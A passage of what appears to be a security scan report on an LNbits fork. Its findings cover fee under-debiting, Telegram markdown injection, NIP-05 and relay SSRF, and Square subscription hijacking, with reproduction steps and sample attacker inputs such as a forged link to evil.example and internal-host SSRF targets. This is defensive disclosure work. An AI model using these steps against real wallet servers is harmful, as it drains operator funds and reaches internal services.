Ledger integrity: every outgoing LNPay payment is under-debited by its real routing fee, so the apipayments ledger overstates user balances relative to the funding source and a user with a routing hop extracts operator funds, bounded per payment by LNPay's fee policy and repeatable as long as the attacker can fund the wallet. No confidentiality or availability impact.

## Reproduction steps
1. Attacker: any registered user with a wallet admin key (registration open by default). They POST /api/v1/payments {out:true, bolt11} for an invoice whose route passes through a fee-charging hop they control; LNPay pays amount plus routing fee (no fee limit is sent), LNbits debits amount plus service fee only, deterministically on every successful payment. Attack requirements are present: the instance must run the LNPayWallet funding source (documented and default-allowed, but one choice among many), and the attacker needs a routing node to capture the fee. Because incoming Lightning invoices fail under this backend, the attacker's balance must be funded out-of-band (fiat provider, admin credit, internal transfer), which limits cycle rate but not the per-payment loss.

## Recommended fix
1. LNPayWallet.pay_invoice discards the backend-reported routing fee and reports a constant 0, violating the PaymentResponse contract that fee_msat reflects the fee actually paid and causing core to release the routing-fee reserve on settlement. Fix criteria: A successful LNPay payment reports the routing fee from the backend's lnTx record, or reports fee_msat=None and leaves the payment pending until get_payment_status supplies the fee, so the reserve is never released on an unknown fee. Verify: with a mocked withdraw response whose lnTx carries a non-zero fee_msat, the resulting Payment.fee equals -(that fee + service fee) and the sender's balance is reduced accordingly.
2. LNPayWallet.pay_invoice never forwards fee_limit_msat to the backend, so the fee LNPay pays is bounded only by LNPay's policy rather than the reserve LNbits verified at dispatch. Fix criteria: The withdraw request carries the LNbits fee limit (or the payment is refused when the backend cannot honour one), so the routing fee can never exceed what the payer's balance was checked against.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257534

---

# Telegram notifications send wallet names with parse_mode=markdown, letting wallet-key holders break or forge admin alerts

## Details
Admin Telegram alerts for large payments are rendered from fixed templates with `str.format` and sent with `parse_mode: "markdown"` (Telegram legacy Markdown). The `wallet_name` value is user data: a wallet owner sets it at creation and anyone holding the wallet *admin key* can change it with `PUT /api/v1/wallet/{new_name}` or `PATCH /api/v1/wallet` (the route the web UI uses) with no account session and no validation of the string; the only sanitization LNbits applies to stored strings (`rewrite_values`, db.py:149) strips `<…>` and HTML entities on fetch and leaves markdown metacharacters untouched. Nothing escapes `` ` ``, `*`, `_`, `[` before the send, so the name controls the structure of the message.

Path: a payment on the wallet whose amount is >= `lnbits_notification_incoming/outgoing_payment_amount_sats` (default 1,000,000 sats) reaches `send_chat_payment_notification` (invoice listener `dispatch_payment_notification`, app.py:583; outgoing path payments.py:1065/1306), which puts `wallet.name` into `values` and enqueues an admin notification; `process_next_notification` formats the template and `send_admin_notification` posts it to the operator's configured chat.

Two concrete effects:

1. Alert suppression. The templates wrap the name in a code span (`` `{wallet_name}` ``). A name containing a backtick (e.g. `` x` ``) closes the span early and leaves an unclosed code entity; Telegram's legacy Markdown parser rejects unbalanced entities with HTTP 400 "Bad Request: can't parse entities" (assumption about the remote Telegram Bot API, which is the documented behaviour of its legacy Markdown mode). `send_notification` catches the `HTTPStatusError` and only logs a warning, so every *PAYMENT SENT*/*PAYMENT RECEIVED* alert for that wallet is silently lost. An attacker who holds a wallet's admin key can rename the wallet and then move funds above the alert threshold without the operator's Telegram alert firing — the alert exists precisely to catch large movements. The wallet owner's own Telegram notifications fail too.

2. Alert forgery. A name such as `` x` *Amount*: `1`*sats*. [details](https://evil.example) `` closes the code span and injects bold text and a clickable link (`[text](url)` is honoured by legacy Markdown) into the operator's alert, enabling misleading amounts or phishing links delivered through a channel the operator trusts as server-generated.

The same unescaped interpolation applies to `memo` in `balance_update` and `username` in `settings_update`, but those values are admin-supplied; the wallet-name path is the one a low-privilege party controls. Holds only where the operator has enabled Telegram notifications (`lnbits_telegram_notifications_enabled`, off by default) — an optional feature whose own handling of user data is the defect, not a shipped control the attacker needs switched off.

Root cause: untrusted text is embedded into a markup-interpreted message without escaping for the chosen parse mode (CWE-116).

## Evidence
1. [lnbits/core/services/notifications.py:177–183](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L177-L183)
   send_telegram_message posts the rendered text with parse_mode='markdown'; no escaping of markdown metacharacters is applied anywhere upstream. This is where the fix (escape per parse mode, or plain-text fallback) belongs.
2. [lnbits/core/models/notifications.py:62–68](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/notifications.py#L62-L68)
   The incoming/outgoing payment templates embed {wallet_name} inside a code span; a name containing a backtick closes the span and the remainder is interpreted as markdown, or leaves an unclosed entity that Telegram rejects.
3. [lnbits/core/services/notifications.py:358–375](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L358-L375)
   wallet.name is placed into values unescaped, and the admin notification is enqueued when a payment meets lnbits_notification_*_payment_amount_sats (default 1,000,000 sats) — the large-movement alerts an operator relies on.
4. [lnbits/core/views/wallet\_api.py:137–203](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L137-L203)
   PUT /api/v1/wallet/{new_name} (:137-152) and PATCH /api/v1/wallet (:186-203, used by the web UI's updateWallet) rename a wallet with only the wallet admin key (require_admin_key) and store the string without any validation.
5. [lnbits/core/services/notifications.py:119–127](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L119-L127)
   A Telegram 400 'can't parse entities' is caught and only logged as a warning; the alert is silently lost with no plain-text fallback.
6. [lnbits/db.py:147–153](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L147-L153)
   rewrite_values, the only sanitization applied to stored strings, strips '<…>' and HTML entities on fetch; backticks, asterisks, underscores and brackets pass through to the notification.

## Impact
Integrity of the operator's alerting channel: large-payment alerts can be suppressed for the attacker's wallet or made to carry attacker-controlled formatting and links in a channel the operator trusts as server-generated. No confidentiality impact; no availability impact on LNbits itself.

## Reproduction steps
1. Attacker is an ordinary user (own wallet) or anyone holding a wallet admin key, both in-scope adversaries. They rename the wallet via PUT /api/v1/wallet/<name> or PATCH /api/v1/wallet with a stray backtick (or crafted markdown), then a payment above the alert threshold on that wallet produces an admin Telegram message that Telegram rejects (alert lost) or renders with attacker text/links. Requires the operator to have enabled Telegram notifications and a payment at/above the configured threshold (attack requirements present). Depends on Telegram Bot API legacy Markdown rejecting unbalanced entities, stated as an assumption about the remote service.

## Recommended fix
1. User-controlled values (wallet name, and generally all interpolated values) are embedded into a message that Telegram parses as markdown without escaping for that parse mode. Fix criteria: Escape every interpolated value for the chosen Telegram parse mode (or send notifications as plain text / MarkdownV2 with escaping) so that a wallet named with backticks, asterisks, underscores or brackets still produces a delivered, correctly rendered alert whose structure the value cannot alter.
2. A formatting rejection from Telegram is swallowed as a warning, so an alert can be dropped without the operator noticing. Fix criteria: On a Telegram parse error, retry the same alert as plain text (no parse_mode) so an admin alert is never silently lost because of its content.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper Output Encoding
**CWE:** [CWE-116](https://cwe.mitre.org/data/definitions/116.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257531

---

# Breez SDK backend discards fee_limit_msat, letting payers overdraw via self-routed fees

## Details
The Wallet contract (lnbits/wallets/base.py:150-153, pay_invoice(bolt11, fee_limit_msat)) makes the funding backend responsible for refusing a payment whose routing fee exceeds the reserve the core withheld from the payer's wallet; settings.py:388-390 states that a mismatch between the balance-checked reserve and the limit the backend enforces 'may cause a vulnerability'. BreezSdkWallet.pay_invoice (lnbits/wallets/breez.py:212-230) explicitly drops the limit (`logger.debug(f"fee_limit_msat {fee_limit_msat} is ignored by Breez SDK")`) and submits SendPaymentRequest(bolt11, use_trampoline) with no fee ceiling; __init__ (:140-148) also leaves the SDK's Config fee parameters at default_config values rather than aligning them with LNbits' reserve settings. On success the adapter returns the SDK's real payment.fee_msat (:260-266), which update_payment_success_status (core/services/payments.py:1052) debits in full (`payment.fee = -(abs(status.fee_msat)+service_fee)`); the balances view (`SUM(amount - ABS(fee))`, migrations.py:548-549) then leaves the wallet negative by actual_fee - reserve.

An ordinary LNbits user (wallet admin key, POST /api/v1/payments) controls the destination invoice. By issuing an invoice from their own node that carries a route hint through a second node they control with a large base fee, the payer makes the Greenlight node pay that fee to the attacker. The core only required balance >= amount + max(2 sat, 1%) (payments.py:889-896, settings.py:390-396); whatever the SDK pays above that is taken from the operator's pooled funds, and the attacker can repeat with fresh wallets (registration is open by default, settings.py:47).

Assumption on the dependency (breez-sdk~=0.8.0, pyproject.toml:67): default_config(EnvironmentType.PRODUCTION, ...) sets maxfee_percent=1.0 and exemptfee_msat=20000, which the SDK forwards to the node's pay as maxfeepercent/exemptfee, so any fee up to 20 sat is accepted regardless of percentage. Under that assumption a 100-sat payment with an 18-sat hinted fee passes the SDK while LNbits reserved only 2 sat: the attacker receives 118 sat for a 102-sat wallet balance, up to ~16 sat gain per wallet (less real LSP hop fees). If the admin lowers lnbits_reserve_fee_percent below the SDK's percentage the gap also opens for large payments. If the SDK default differed, the gap would be whatever the SDK permits minus the LNbits reserve; the adapter provides no bound of its own either way.

Backends with a per-payment fee parameter forward the limit (lndrest.py:187, clnrest.py:279, eclair.py:166, sparkl2.py:145, bark.py:316-348, boltz.py:253-261, breez_liquid.py:196-208, blink.py:297), and docs/guide/wallets.md:142 documents the resulting 'fee of X msat exceeds limit of Y msat' rejection as expected behaviour; the Greenlight adapter alone receives the limit and discards it.

## Evidence
1. [lnbits/wallets/breez.py:212–230](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/breez.py#L212-L230)
   pay_invoice receives fee_limit_msat from the core but only logs that it 'is ignored by Breez SDK' (:215); SendPaymentRequest is built with bolt11 and use_trampoline only (:224-226), so no per-payment fee ceiling from LNbits reaches the SDK. This is the code the fix must change.
2. [lnbits/wallets/breez.py:140–148](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/breez.py#L140-L148)
   __init__ takes default_config(EnvironmentType.PRODUCTION, ...) and overrides only working_dir; the SDK's own fee knobs (maxfee_percent / exemptfee_msat on Config) are never aligned with lnbits_reserve_fee_min / lnbits_reserve_fee_percent, so the only fee bound in effect is the SDK's default, not LNbits' reserve.
3. [lnbits/wallets/breez.py:260–265](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/breez.py#L260-L265)
   On COMPLETE the adapter reports the SDK's actual payment.fee_msat back to the core unconditionally, with no comparison against fee_limit_msat.
4. [lnbits/core/services/payments.py:887–926](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L887-L926)
   The core admits the payment when wallet.balance_msat >= amount + fee_reserve_total (:889-896) and records fee = -reserve (:902); fee_reserve_msat (:909) is the only over-spend guard and is passed to the backend via _fundingsource_pay_invoice (:926) as the limit the backend is expected to enforce.
5. [lnbits/core/services/payments.py:1038–1055](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1038-L1055)
   update_payment_success_status writes payment.fee = -(abs(status.fee_msat) + service_fee) (:1052) with no clamp to the reserve that was balance-checked.
6. [lnbits/core/migrations.py:545–556](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L545-L556)
   The balances view computes SUM(amount - ABS(fee)); once the actual fee exceeds the reserve the payer's wallet balance goes negative by (actual fee - reserve), i.e. the pooled funding node paid more than the ledger authorised.
7. [lnbits/settings.py:381–396](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L381-L396)
   Default reserve is max(2000 msat, 1% of amount); the project's own WARN comment (:388-390) states the same value 'must be used for balance check and passed to funding_source.pay_invoice(), it may cause a vulnerability if the values differ' — the backend enforcing the passed limit is a shipped security control, which the Breez adapter does not honour.

## Impact
Operator funds leave the funding node beyond what the ledger authorised; the payer's wallet is left negative, so the apipayments ledger no longer backs the funding source. Per-payment gain is bounded by the SDK's own fee ceiling (assumed 20 sat exempt fee or 1% for breez-sdk 0.8.x) minus the reserve, but is repeatable across freshly created wallets, so integrity of funds is affected in a limited-per-event but accumulating way. No confidentiality or availability impact.

## Reproduction steps
1. Attacker is any registered LNbits user with a funded wallet on an instance whose funding source is BreezSdkWallet (the adapter is production code selected by LNBITS_BACKEND_WALLET_CLASS). They generate an invoice on their own Lightning node with a route hint through a second node they control charging a high fee, pay it via POST /api/v1/payments with their wallet admin key, and receive amount plus fee while their wallet was only required to hold amount plus the small reserve. No LNbits-side control clamps the actual fee; the only requirements are controlling two Lightning nodes reachable from Greenlight (attack_requirements PRESENT) and holding an ordinary account (privileges LOW).

## Recommended fix
1. BreezSdkWallet.pay_invoice ignores the fee_limit_msat the core computed from the payer's reserved balance, and the adapter never aligns the SDK Config fee bounds with LNbits' reserve settings, so the backend may pay more in fees than the ledger withheld and the wallet is debited below zero. Fix criteria: A payment whose routing fee would exceed fee_limit_msat must not be dispatched by the Breez backend — via the SDK's per-payment or Config fee controls set from the passed limit, or a pre-flight fee estimate compared against fee_limit_msat — so that the fee debited on success can never exceed the reserve the core verified. Verify by paying an invoice whose route hint demands a fee above the reserve: the payment must fail or be capped, and no wallet balance may become negative.
2. The core trusts every backend to enforce the fee limit and writes the reported fee without checking it against the reserve it balance-checked. Fix criteria: Independently of the backend, the core should detect a reported fee above the reserved limit (log/alert, and prevent the wallet from going negative or surface the overdraft to the operator), so that an adapter that cannot enforce the limit does not silently overdraw pooled funds.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper Enforcement of Limits
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257524

---

# User-chosen NIP-05 domain drives server GET with path control, and remote relays are dialled unvalidated

## Details
Users set a Nostr identifier (`name@domain`) in their notification preferences via `PATCH /api/v1/auth` (`lnbits/core/views/auth_api.py:589-600` assigns `account.extra = data.extra` wholesale; `UserNotifications.nostr_identifier` in `lnbits/core/models/users.py:24-30` is an unvalidated `str | None`, and `incoming_payments_sats`/`outgoing_payments_sats` default to 0 so every payment on the user's wallets qualifies). When the operator has enabled Nostr notifications (`lnbits_nostr_notifications_enabled`, default False, plus a private key — an admin UI feature), every qualifying payment on that user's wallet (`send_chat_payment_notification`, `notifications.py:377-389`, reached from the permanent `process_next_notification` task) calls `fetch_nip5_details(identifier)`; a WASM extension with `notifications.send_user_notification` can also trigger it.

`fetch_nip5_details` (`lnbits/core/services/nostr.py:50-63`) splits on '@' and checks only that `https://{domain}` parses with a scheme and netloc (`is_valid_url`, `helpers.py:136-141`). `domain` may therefore carry `host:port/path?query`, e.g. `10.0.0.2:8443/admin/api/reset?x=`, and the server issues `GET https://10.0.0.2:8443/admin/api/reset?x=/.well-known/nostr.json?name=alice` with a default `httpx.AsyncClient()` (httpx 0.27.2: redirects off, TLS verification on, no destination policy). This first hop reaches any host/port/path the user names, but only services presenting a certificate valid for that name; internal services behind public-CA certificates and all internet hosts qualify. Only `names`/`relays` are consumed and failures are logged, so it is blind.

The second hop is fully attacker-controlled: the JSON served by the user's own domain lists `relays`, and `send_nostr_dm` (`nostr.py:32-39`) passes each string to websocket-client 1.9.2 `create_connection(relay, timeout=2)` with no `is_ws_url` or host check. `ws://` URLs open a plaintext TCP connection to any host:port — loopback, RFC1918, link-local metadata — and send an HTTP/1.1 `GET <path>` with `Upgrade: websocket` headers; if the peer answers 101 the signed Nostr event is written to it. Any internal HTTP service receives an attacker-chosen GET; non-101 responses (status, headers, body) land in the server log only. The relay list length is unbounded.

The project's shipped outbound-request controls for this same user position — `check_callback_url` with the default `lnbits_callback_url_rules` (dotted hostnames only), `lnbits_callback_allow_private_ips=False` with IP pinning in `_post_webhook` (`notifications.py:470-503`), and `lnbits_lnurl_allow_private_ips=False` with resolution checks in `services/lnurl.py:450-458` — are not applied to either hop. Root cause: user-supplied and remote-supplied URLs reach outbound network calls with no destination policy. Holds only where the admin has enabled Nostr notifications. The blocking nature of the relay dials is filed separately (nostr-relay-sync-dials-block-event-loop).

## Evidence
1. [lnbits/core/services/nostr.py:50–63](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/nostr.py#L50-L63)
   fetch_nip5_details splits the user's identifier at '@' and checks only is_valid_url(f'https://{domain}') (scheme+netloc present). `domain` may contain host:port and a path/query, so the GET goes to https://<any host>:<port>/<any path>?... with a default httpx.AsyncClient (no private-IP or allow-list check, no IP pinning).
2. [lnbits/core/services/nostr.py:32–39](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/nostr.py#L32-L39)
   Relay URL strings returned by the remote nostr.json are passed straight to websocket-client create_connection(); is_ws_url (utils/nostr.py) and any host/IP policy are absent, so ws://<loopback or RFC1918 host>:<port>/<path> chosen by the user's server is dialled in plaintext with an HTTP Upgrade GET, and the signed event is written on a 101.
3. [lnbits/core/services/notifications.py:154–166](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L154-L166)
   send_nostr_notification feeds the user's nostr_identifier into fetch_nip5_details and the returned relays into send_nostr_dm, signing with the server's notification key.
4. [lnbits/core/services/notifications.py:377–389](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L377-L389)
   send_chat_payment_notification enqueues a user notification for every payment on the user's wallets whose amount meets the user's own thresholds (default 0), so any payment the user makes or receives triggers the lookup.
5. [lnbits/core/views/auth\_api.py:589–600](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L589-L600)
   PATCH /api/v1/auth lets any account replace account.extra wholesale, including extra.notifications.nostr_identifier and the sats thresholds, with no validation of the identifier.
6. [lnbits/core/models/users.py:24–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L24-L30)
   UserNotifications.nostr_identifier is an unvalidated `str | None`; thresholds default to 0.
7. [lnbits/core/helpers.py:136–141](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/helpers.py#L136-L141)
   is_valid_url only requires a scheme and netloc; it does not constrain the host, port or path.
8. [lnbits/core/services/lnurl.py:450–458](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lnurl.py#L450-L458)
   The shipped control for user-driven outbound requests: LNURL targets are resolved and non-global addresses rejected unless lnbits_lnurl_allow_private_ips is set. Neither NIP-05 lookups nor relay dials receive this treatment.

## Impact
LNbits is made to issue attacker-directed requests from its network position; responses are not returned to the attacker (only logged), so confidentiality NONE and integrity LOW. Subsequent-system impact: Internal HTTPS services with valid certificates receive GETs at attacker-chosen host/port/paths, and any internal plaintext HTTP/websocket service receives Upgrade GETs at attacker-chosen paths on arbitrary ports from the LNbits host; blind, so integrity LOW.

## Reproduction steps
1. A registered user (registration open by default) sets nostr_identifier to `a@<host>:<port>/<path>?q=` or to their own HTTPS domain whose nostr.json lists `ws://127.0.0.1:<port>/<path>` (or any RFC1918/link-local host) as relays, then makes or receives any payment on one of their wallets. Requires the operator to have enabled Nostr notifications with a signing key (admin feature, off by default) — AT:P. Dependency assumptions: httpx 0.27.2 AsyncClient defaults (verify on, follow_redirects off); websocket-client 1.9.2 create_connection accepts ws/wss only and sends a plaintext HTTP Upgrade GET for ws://.

## Recommended fix
1. The NIP-05 domain is accepted with only a scheme/netloc check and interpolated into the request URL, allowing host, port and path control. Fix criteria: Restrict the identifier's domain to a bare hostname (no port, path or query), resolve it and reject non-global addresses unless private callbacks are explicitly allowed, and build the URL from validated components; `a@10.0.0.2:8443/x` must be rejected before any request.
2. Relay URLs from the remote nostr.json are dialled without validation. Fix criteria: Apply is_ws_url plus the same non-global address rejection to every relay before connecting, and bound the number of relays tried; a relay list naming loopback or RFC1918 hosts must result in no connection attempt.

---
**Severity:** LOW
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257412

---

# Square invoice.payment_made resolves payee wallet via user-settable external_id across all wallets

## Details
For Square subscriptions, recurring charges arrive as `invoice.payment_made` webhooks. `_handle_square_invoice_payment_made` (lnbits/core/views/callback_api.py) fetches the Square payment for the invoice's order and, if its `note` does not carry LNbits metadata (the normal case for recurring Square invoice payments), falls back to locating the LNbits owner of the subscription: it queries `get_payments(filters=[external_id == subscription_id], sortby=created_at desc, limit=1)` across the whole `apipayments` table and uses the matched payment's `wallet_id` as the wallet to credit. The match is not restricted to payments LNbits itself created for that Square subscription (fiat_provider == 'square', checking_id prefix fiat_square_payment_), nor to any wallet.

`external_id` is a user-chosen field on every invoice: `POST /api/v1/payments` with an invoice key accepts `external_id` (CreateInvoice.external_id, validated only for length/whitespace). A user who knows the Square subscription id S of a victim's subscription therefore creates any invoice in their own wallet with `external_id = S`; because the query orders by created_at desc with limit 1, their newer row wins over the victim's original. On every subsequent `invoice.payment_made` for S, `_handle_square_subscription_payment` mints and settles a fiat payment for the charged amount on the attacker's wallet, and the victim receives nothing. The attacker also inherits `tag`/`extra` from their own payment into the minted one.

Reachability: the handler is live whenever Square and its webhook are configured. Square subscription *creation* through LNbits is disabled while `settings.lnbits_running` is true (square.py:140-143), so this requires Square subscriptions to exist in the operator's Square account that produce `invoice.payment_made` events — e.g. subscriptions created by the operator in Square, created before the flag, or the operator's non-LNbits subscription business — and the attacker to know the subscription id (returned to subscribers as external_id on their payments, shown in Square receipts). Filed with those conditions.

## Evidence
1. [lnbits/core/views/callback\_api.py:566–593](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L566-L593)
   When the Square payment's note carries no LNbits metadata, the handler looks for a stored payment by fiat_square_payment_{id} and then, failing that, runs get_payments(filters=external_id == subscription_id, newest first, limit 1) with NO wallet_id restriction and no fiat_provider/checking_id constraint, and takes that payment's wallet_id as the payee (via _square_payment_options_from_payment, 660-670).
2. [lnbits/core/views/callback\_api.py:603–657](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L603-L657)
   _handle_square_subscription_payment then creates and settles a new fiat payment for the Square invoice's amount on that wallet_id, so whoever owns the matched payment is credited.
3. [lnbits/core/models/payments.py:318](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L318)
   CreateInvoice.external_id is a free-form caller-supplied string (<=256 chars, no spaces) accepted on POST /api/v1/payments with an invoice key, so any user can create a payment in their own wallet whose external_id equals a victim's Square subscription id.
4. [lnbits/core/crud/payments.py:138–144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L138-L144)
   get_payments_paginated only adds a wallet_id clause when one is passed; with none, the external_id filter matches payments of every wallet.
5. [lnbits/core/views/callback\_api.py:548–564](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L548-L564)
   Entry point: invoice.payment_made from the Square webhook; the Square payment is fetched from Square's API (trusted) but the mapping to an LNbits wallet is the vulnerable step.

## Impact
Ledger integrity across the user↔user and user↔operator boundary: each invoice.payment_made for subscription S mints and settles a fiat payment (create_fiat_invoice → check_fiat_status → Square payment COMPLETED) on whichever wallet owns the newest apipayments row with external_id == S. The hijack is persistent: the payment minted on the attacker's wallet itself carries external_id=S and is newer still, so every later cycle follows without further action. For subscriptions that exist only in the operator's Square account (no LNbits metadata), the attacker is credited sats from the operator's pot for fiat the operator received outside LNbits. Amount per cycle is bounded by the subscription charge, and the attacker must know S.

## Reproduction steps
1. Attacker: a self-registered user with an invoice key for their own wallet. They create an invoice with external_id set to a victim's Square subscription id (knowledge required), then wait for Square's signed invoice.payment_made webhook for that subscription; the handler's unscoped external_id lookup selects the attacker's newer payment and credits their wallet. Requires Square subscriptions to exist in the merchant account whose invoice payments reach the LNbits webhook.

## Recommended fix
The owner of a Square subscription is inferred from any payment in any wallet whose user-settable external_id equals the Square subscription id. Fix criteria: The subscription→wallet mapping must be derived only from records LNbits created for that subscription (e.g. payments with fiat_provider == 'square' and a webhook-assigned checking_id, or a dedicated server-side mapping written when the first subscription payment is processed), never from caller-settable external_id alone. Verify that a user-created invoice with external_id equal to another subscription's id does not change which wallet is credited.

---
**Severity:** LOW
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257402

---

# Square cancel_subscription falls back to caller-supplied id, letting any wallet cancel any merchant subscription

## Details
`SquareWallet.cancel_subscription` (lnbits/fiat/square.py:200-215) backs `DELETE /api/v1/fiat/square/subscription/{subscription_id}` (lnbits/core/views/fiat_api.py:170-185), which any LNbits user can call with the admin key of their own wallet; the route checks only that Square is enabled (`settings.is_fiat_provider_enabled`, settings.py:838-852), not the per-user `square_limits.allowed_users` list. The helper `_get_square_subscription_id(subscription_id, wallet_id)` (square.py:552-610) is the ownership check the `FiatProvider` contract requires (base.py:188-192): it searches the caller's wallet for a Square payment whose `external_id` or `extra.subscription_request_id` equals the supplied value. If neither search matches — exactly the case when the subscription belongs to a different wallet or to a non-LNbits customer of the merchant — or if the lookup raises, it returns the raw caller-supplied `subscription_id` (line 610). `cancel_subscription` then POSTs `/v2/subscriptions/{id}/cancel` to Square with the operator's access token (`settings.square_access_token`).

So a self-registered user who knows a Square subscription id in the operator's Square account can cancel it with `DELETE /api/v1/fiat/square/subscription/<victim-square-subscription-id>` and their own admin key. Square subscription ids are not secret-grade (the merchant sees them in the Square dashboard and exports; LNbits stores them as `external_id` on the owning payment, callback_api.py:653) but they are not enumerable, so the attacker must learn a victim id. The response reveals only ok/error. The sanctioned path concedes a wallet only cancellation of its own subscriptions (the two wallet-scoped lookups); the fallback hands it every subscription in the merchant account.

